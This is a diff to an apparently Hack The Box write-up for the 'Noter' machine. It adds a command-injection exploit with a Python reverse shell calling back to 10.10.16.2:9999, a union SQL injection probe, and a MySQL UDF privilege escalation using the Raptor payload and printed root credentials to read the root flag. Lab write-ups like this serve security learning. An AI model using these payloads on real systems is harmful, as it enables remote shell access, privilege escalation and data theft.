@@ -219,17 +219,26 @@ ftp_admin ftp_admin@Noter!
 root Nildogg36
 ```
 
-Also the latest patch has a serious vulnerability in `@app.route('/export_note_remote', methods=['POST'])`:
+Also the latest patch has some serious vulnerabilities!
+
+In `@app.route('/export_note_remote', methods=['POST'])`:
 
 ```python
-+                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
-+                    subprocess.run(command, shell=True, executable="/bin/bash")
+                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
+                    subprocess.run(command, shell=True, executable="/bin/bash")
+```
+
+And in `@app.route('/export_note_local/<string:id>', methods=['GET'])`:
+
+```python
+            command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
+            subprocess.run(command, shell=True, executable="/bin/bash")
 ```
 
 ### Command injection
 
-This allows a straightforward command injection in `r.text`, which is filled when
-the server requests a given "url":
+The first vector allows a straightforward command injection in `r.text`,
+which is filled when the server requests a given "url":
 
 ```python
 r = pyrequest.get(url,allow_redirects=True)
@@ -241,15 +250,15 @@ parameters:
 ```shell
 curl -i -s -k -X $'POST' \
     -H $'Content-Type: application/x-www-form-urlencoded' \
-    -b $'session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YoaIQw.fntEnZnQsDZfY6yjJ5XWKkz0V60' \
-    --data-binary $'url=http://10.10.16.2:8888/note.md' \
-    $'http://10.10.11.160:5000/export_note_remote/'
-``` 
+    -b $'session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yodfow.HyndDkV2OQAk7qMO2ZtJ5O2hMoI' \
+    --data-binary $'url=http%3A%2F%2F10.10.16.2%3A8888%2Fnote.md' \
+    $'http://10.10.11.160:5000/export_note_remote'
+```
 
-Fails with:
+And a reverse shell in `note.md`:
 
 ```
-The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+a';python3 -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("10.10.16.2",9999));f=s.fileno;c(["/bin/bash","-i"],stdin=f(),stdout=f(),stderr=f())';#
 ```
 
 ### SQLi
@@ -260,7 +269,77 @@ There's potential for SQLi too:
 result = cur.execute("SELECT * FROM notes where author= %s",[session['username']])
 ```
 
+According to the `/dashboard` page, this table has at least the fields "title",
+"author" and "date". 4 fields with the "id", which can be tested with a union
+query injection:
+
+```sql
+apehex%20UNION%20SELECT%20null,null,null,null,null--%20-
+```
+
+But I couldn't manage to create a JWT for this username...
+
+## Defining a new user function in MySQL
+
+I still haven't leveraged the root access on MySQL. Searching for related
+vulnerabilities, I learned about [MySQL UDF][mysql-udf].
+
+First, let's compile the [Raptor payload][raptor-udf2]:
+
+```shell
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+Reset between attempts:
+
+```shell
+mysql -u'root' -p'Nildogg36' \
+    -e'use mysql;drop table foo;'
+```
+
+Find where the plugin directory, where the payload should be dropped:
+
+```shell
+mysql -u'root' -p'Nildogg36' \
+    -e'use mysql;show variables like "%plugin%";'
+# +-----------------+---------------------------------------------+
+# | Variable_name   | Value                                       |
+# +-----------------+---------------------------------------------+
+# | plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+# | plugin_maturity | gamma                                       |
+# +-----------------+---------------------------------------------+
+```
+
+Then create a UDF `do_system`:
+
+```shell
+mysql -u'root' -p'Nildogg36' \
+    -e'use mysql;create table foo(line blob);' \
+    -e'insert into foo values(load_file("/home/svc/raptor_udf2.so"));' \
+    -e'select * from foo into dumpfile "/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so";' \
+    -e'create function do_system returns integer soname "raptor_udf2.so";' \
+    -e'select * from mysql.func;'
+# +-----------+-----+----------------+----------+
+# | name      | ret | dl             | type     |
+# +-----------+-----+----------------+----------+
+# | do_system |   2 | raptor_udf2.so | function |
+# +-----------+-----+----------------+----------+
+```
+
+And use it:
+
+```shell
+mysql -u'root' -p'Nildogg36' \
+    -e'select do_system("cat /root/root.txt > /tmp/flag.txt; chown svc:svc /tmp/flag.txt");'
+cat /tmp/flag.txt
+# 713679aa17b79d7e610ac9e8791989ad
+```
+
 [author-profile]: https://app.hackthebox.com/users/389926
 [dashboard]: images/dashboard.png
 [hacktricks]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign
 [leak]: images/leak.png
+[mysql-udf]: https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
+[raptor-udf2]: https://www.exploit-db.com/exploits/1518
+
